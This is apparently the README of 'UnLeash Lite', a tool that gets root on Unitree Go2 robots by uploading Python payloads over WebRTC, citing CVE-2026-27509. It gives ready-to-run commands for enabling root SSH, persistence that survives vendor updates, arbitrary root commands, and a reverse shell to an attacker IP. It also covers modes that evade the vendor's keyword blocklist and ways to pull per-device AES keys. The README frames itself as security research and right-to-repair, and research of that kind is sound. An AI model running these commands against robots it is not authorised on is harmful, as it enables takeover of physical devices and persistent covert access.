<div align="center">

```
█   █  █   █  █      █████   ███    ████  █   █
█   █  ██  █  █      █      █   █  █      █   █
█   █  █ █ █  █      ████   █████   ███   █████
█   █  █  ██  █      █      █   █      █  █   █
 ███   █   █  █████  █████  █   █  ████   █   █
                     lite
```

<h2>WebRTC Jailbreak for Unitree Go2 (and more!)</h2>

</div>
v1.1.14 and v1.1.15 support is still in active development! I've added some useful primitives in the meantime. 
 

UnLeash Lite enables root-level SSH access by uploading Python payloads over the WebRTC data channel (the same channel the Unitree app uses). The payload is bound to a controller hotkey and executes as root when pressed.

**Requirements:** LAN access to the robot + a physical controller.

## Install

```bash
pip install .
```

## Usage

```bash
# Enable SSH (default password: unleash)
python -m unleash_lite ssh --robot-ip 192.168.123.161

# Persistent SSH that survives reboots and Unitree OTA updates
python -m unleash_lite ssh-persist --robot-ip 192.168.123.161

# Run an arbitrary command as root
python -m unleash_lite custom --robot-ip 192.168.123.161 --cmd "id"

# Reverse shell
python -m unleash_lite reverse-shell --robot-ip 192.168.123.161 --attacker-ip 192.168.123.100
```

After running, press **L1+Y** on the Go2 controller to execute the payload. Then `ssh root@<robot-ip>`.

### Firmware >= 1.1.15

Firmware 1.1.15 added per-device WebRTC authentication. You'll need the robot's AES-128 key (32 hex characters) to connect.

If you have the robot paired in the Unitree app, fetch the key from the cloud:

```bash
# Print keys for all robots on your account
python -m unleash_lite fetch-key --email you@example.com

# Get key for a specific robot
python -m unleash_lite fetch-key --email you@example.com --sn B42D2000XXXXXXXX
```

If you already have SSH access, read it directly:

```bash
ssh root@192.168.123.161 'xxd -p /unitree/etc/key/aes_key.bin'
```

Then pass it with `--aes-key`:

```bash
python -m unleash_lite ssh --robot-ip 192.168.123.161 --aes-key <key>
```

On firmware 1.1.14 and below, `--aes-key` is not needed.

## Modes

| Mode | Description |
|------|-------------|
| `ssh` | Enable SSH and set root password |
| `ssh-persist` | Persistent SSH with a guard service that survives reboots and future Unitree OTA updates |
| `custom` | Run any shell command as root |
| `reverse-shell` | Open a reverse shell to a specified IP |
| `bypass-hosts` | Write MQTT DNS redirect to `/etc/hosts` (CVE-2026-27509 bypass) |
| `bypass-file` | Write arbitrary file content (CVE-2026-27509 bypass) |
| `bypass-cron` | Install a cron job for command execution (CVE-2026-27509 bypass) |
| `bypass-escalate` | Two-press self-overwrite escalation (CVE-2026-27509 bypass) |

The `bypass-*` modes work on firmware 1.1.14+ where Unitree added a keyword blocklist to `programming_actuator`. They encode payloads as byte arrays and use `np.savetxt` for file I/O to avoid the filter.

## Options

```
--robot-ip IP        Robot IP address (default: 192.168.123.161)
--port PORT          WebRTC signaling port (default: 9991)
--hotkey HOTKEY       Controller hotkey binding (default: L1+Y)
--password PASS      Root password for ssh modes (default: unleash)
--cmd CMD            Shell command for 'custom' mode
--attacker-ip IP     Target IP for reverse-shell / bypass-hosts
--aes-key KEY        Per-device AES-128 key for firmware >= 1.1.15 (32 hex chars)
--callback-ip IP     This machine's IP for verification (auto-detected)
--callback-port PORT Callback listener port (default: 19999)
--no-callback        Skip callback verification
--timeout SECS       Callback wait timeout (default: 120s)
```

## How It Works

1. Connects to the robot's WebRTC signaling endpoint over HTTP (port 9991)
2. Establishes a WebRTC data channel (the same one the Unitree app uses)
3. Uploads a Python script via the `programming_actuator` API
4. Binds the script to a controller hotkey
5. When you press the hotkey, the robot executes the script as root

On firmware <= 1.1.14, the WebRTC signaling uses a static AES key shared across all robots. On firmware >= 1.1.15, Unitree switched to a per-device AES-128 key (see `fetch-key` above). Both versions are supported.

## Acknowledgments

This tool builds on publicly disclosed security research by multiple independent teams. Credit where it's due:

**Olivier Laflamme (Boschko) and Ruikai Peng** discovered that `programming_actuator` executes arbitrary Python as root with no authentication ([CVE-2026-27509](https://nvd.nist.gov/vuln/detail/CVE-2026-27509)). Their exploit reaches it by joining DDS domain 0 directly on the LAN. UnLeash Lite exploits the same underlying vulnerability but delivers payloads through the WebRTC data channel instead (see below). Their writeup at [boschko.ca](https://boschko.ca/unitree-go2-rce/) documents the DDS attack chain.

**Andreas Makris (Bin4ry), Kevin Finisterre (h0stile), and Konstantin Severov (legion1581)** disclosed the broader Unitree security architecture weaknesses ([CVE-2025-35027](https://nvd.nist.gov/vuln/detail/CVE-2025-35027), [arXiv:2509.14139](https://arxiv.org/abs/2509.14139)): hardcoded AES keys, the WebRTC signaling protocol, and the fleet-wide shared cryptographic material that makes the WebRTC connection possible. legion1581's [`unitree_webrtc_connect`](https://github.com/legion1581/unitree_webrtc_connect) was foundational for the WebRTC data channel implementation.

UnLeash Lite does not use BLE (the specific attack vector in CVE-2025-35027) or direct DDS (the delivery method in CVE-2026-27509).

## Legal

This software is provided for **security research, education, and
right-to-repair purposes only**. By using it, you agree that:

- You own the robot you are targeting, or have explicit written
  authorization from its owner.
- You are solely responsible for complying with all applicable local,
  state, national, and international laws.
- The authors and contributors accept no liability for damages,
  legal consequences, or misuse arising from this software.

## License

MIT
